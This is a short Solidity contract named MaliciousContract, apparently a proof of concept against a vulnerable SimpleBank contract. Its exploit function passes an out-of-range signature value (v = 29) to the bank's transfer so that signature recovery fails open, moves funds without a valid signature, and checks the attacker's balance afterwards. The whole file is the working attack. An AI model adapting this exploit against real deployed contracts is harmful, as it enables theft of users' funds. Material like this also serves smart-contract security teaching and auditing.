// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./ecrecover.sol";

contract MaliciousContract {
    SimpleBank public targetBank;
    address public attacker;

    constructor(address _targetBank) {
        targetBank = SimpleBank(_targetBank);
        attacker = msg.sender;
    }

    function exploit(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        bytes32 _r,
        bytes32 _s
    ) public {
        // Use an invalid v value (not 27 or 28) to trigger the vulnerability
        uint8 invalidV = 29;

        // Attempting the transfer using the invalid signature parameters
        targetBank.transfer(_to, _amount, _hash, invalidV, _r, _s);

        // Require statement to check if exploit was successful
        // It assumes a getBalance function to verify the attack success
        require(targetBank.getBalance(attacker) >= _amount, "Exploit failed");
    }
}